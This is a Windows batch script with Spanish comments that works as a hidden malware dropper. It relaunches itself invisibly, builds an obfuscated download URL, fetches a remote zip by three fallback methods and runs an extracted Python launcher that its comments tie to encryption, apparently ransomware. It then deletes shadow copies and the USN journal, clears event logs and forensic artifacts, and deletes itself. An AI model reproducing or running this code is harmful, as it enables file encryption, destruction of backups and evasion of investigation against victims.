@echo off
setlocal enabledelayedexpansion

REM === EJECUCIÓN 100% INVISIBLE ===
if not "%1"=="h" (
    set "vbs=%TEMP%\~%RANDOM%.vbs"
    echo Set s=CreateObject("WScript.Shell"):s.Run "cmd /c ""%~f0"" h",0,False > "!vbs!"
    wscript //nologo "!vbs!"
    del /f /q "!vbs!" >nul 2>&1
    exit /b
)

REM === AUTO-REPLICACIÓN AL TEMP ===
if not "%2"=="w" (
    set "t=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!t!" >nul 2>&1
    if exist "!t!" (
        start /b cmd /c call "!t!" h w
        timeout /t 1 /nobreak >nul 2>&1
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

REM === CONSTRUCCIÓN DE URL OFUSCADA ===
set "p1=https://"
set "p2=files."
set "p3=catbox"
set "p4=.moe/"
set "p5=d6"
set "p6=ck"
set "p7=99"
set "p8=.zip"
set "url=%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%"

REM === CONFIGURACIÓN ===
set "zip_file=%TEMP%\~repo%RANDOM%.tmp"
set "extract_dir=%TEMP%\~sys%RANDOM%"

REM === DESCARGAR CON TRIPLE FALLBACK ===
powershell -w h -nop -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$ProgressPreference='SilentlyContinue';try{Invoke-WebRequest -Uri '%url%' -OutFile '%zip_file%' -UseBasicParsing -TimeoutSec 120}catch{}" >nul 2>&1

if not exist "%zip_file%" curl -L -s -o "%zip_file%" "%url%" --connect-timeout 60 --max-time 180 >nul 2>&1
if not exist "%zip_file%" certutil -urlcache -split -f "%url%" "%zip_file%" >nul 2>&1

if not exist "%zip_file%" exit /b 1

REM === VERIFICAR TAMAÑO ===
for %%F in ("%zip_file%") do set "size=%%~zF"
if %size% lss 1000000 (
    del /f /q "%zip_file%" >nul 2>&1
    exit /b 1
)

REM === EXTRAER ===
powershell -w h -nop -c "Expand-Archive -Path '%zip_file%' -DestinationPath '%extract_dir%' -Force" >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1

REM === BUSCAR Y EJECUTAR ===
set "found=0"
for /d %%D in ("%extract_dir%\*") do (
    if exist "%%D\launcher.py" (
        if exist "%%D\python_portable\python.exe" (
            cd /d "%%D"
            start /b "" "%%D\python_portable\python.exe" "%%D\launcher.py"
            set "found=1"
            goto cleanup
        )
    )
)

:cleanup
REM === ESPERAR A QUE LAUNCHER TERMINE (IMPORTANTE) ===
REM Esperar 60 segundos para instalación de dependencias
timeout /t 60 /nobreak >nul 2>&1

REM Esperar hasta que launcher.py haya desaparecido (auto-destrucción)
:wait_loop
if exist "%extract_dir%\encriptado-main\launcher.py" (
    timeout /t 10 /nobreak >nul 2>&1
    goto wait_loop
)

REM Esperar 30 segundos adicionales para que termine encriptación
timeout /t 30 /nobreak >nul 2>&1

REM === SECURE DELETE DEL ZIP (3-PASS) ===
if exist "%zip_file%" (
    powershell -w h -c "$s=%size%;$b=New-Object byte[] $s;[IO.File]::WriteAllBytes('%zip_file%',$b);$b=New-Object byte[] $s;for($i=0;$i -lt $s;$i++){$b[$i]=0xFF};[IO.File]::WriteAllBytes('%zip_file%',$b);$b=New-Object byte[] $s;(New-Object Random).NextBytes($b);[IO.File]::WriteAllBytes('%zip_file%',$b)" >nul 2>&1
    del /f /q "%zip_file%" >nul 2>&1
)

REM === LIMPIAR DNS CACHE ===
ipconfig /flushdns >nul 2>&1

REM === ELIMINAR VOLUME SHADOW COPIES (VSS) ===
vssadmin delete shadows /all /quiet >nul 2>&1
wmic shadowcopy delete /nointeractive >nul 2>&1

REM === ELIMINAR USN JOURNAL ===
fsutil usn deletejournal /D /N C: >nul 2>&1
for %%d in (D E F G H) do (
    if exist %%d:\ fsutil usn deletejournal /D /N %%d: >nul 2>&1
)

REM === LIMPIEZA ANTI-FORENSE COMPLETA ===
powershell -w h -nop -c "$e='SilentlyContinue';Remove-Item 'C:\Windows\Prefetch\*.pf' -Force -ea $e;Clear-RecycleBin -Force -Confirm:$false -ea $e;wevtutil cl Application 2>$null;wevtutil cl System 2>$null;wevtutil cl Security 2>$null;Remove-Item '$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -Force -ea $e;Get-ChildItem '$env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer' -Filter '*.db' -ea $e|Remove-Item -Force -ea $e;Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\AppCompat\Programs' -Filter 'Amcache*.hive' -ea $e|Remove-Item -Force -ea $e;Get-ChildItem '$env:LOCALAPPDATA\Microsoft\Windows\CoreApplicationData' -Recurse -Filter '*.db' -ea $e|Remove-Item -Force -ea $e;Remove-Item '$env:USERPROFILE\AppData\Local\Microsoft\Windows\FileHistory' -Recurse -Force -ea $e;Get-ChildItem '$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent' -Filter '*.lnk' -ea $e|Remove-Item -Force -ea $e;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ea $e;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'OpenSavePidlMRU' -ea $e;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32' -Name 'LastVisitedPidlMRU' -ea $e;Stop-Service -Name DiagTrack -Force -ea $e;Remove-Item 'C:\Windows\System32\sru\*.dat' -Force -ea $e;Start-Service -Name DiagTrack -ea $e;Remove-Item 'C:\Windows\appcompat\Programs\*.txt' -Force -ea $e" >nul 2>&1

REM === LIMPIAR SHIMCACHE ===
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f >nul 2>&1

REM === LIMPIAR WINDOWS TIMELINE ===
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\TaskFlow" /f >nul 2>&1
del /f /q "%LOCALAPPDATA%\ConnectedDevicesPlatform\*.db" >nul 2>&1
del /f /q "%LOCALAPPDATA%\ConnectedDevicesPlatform\*.db-wal" >nul 2>&1

REM === LIMPIAR BAM/DAM (Background Activity Moderator) ===
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" /f >nul 2>&1

REM === AUTO-DESTRUCCIÓN DELAYED ===
set "cleanup=%TEMP%\~c%RANDOM%.bat"
(
echo @echo off
echo timeout /t 10 /nobreak ^>nul 2^>^&1
echo taskkill /f /im wscript.exe ^>nul 2^>^&1
echo taskkill /f /im cmd.exe ^>nul 2^>^&1
echo rmdir /s /q "%extract_dir%" ^>nul 2^>^&1
echo del /f /q "%~f0" ^>nul 2^>^&1
echo ^(goto^) 2^>nul ^& del /f /q "%%~f0" ^& exit
) > "%cleanup%"

start /b cmd /c "%cleanup%"
exit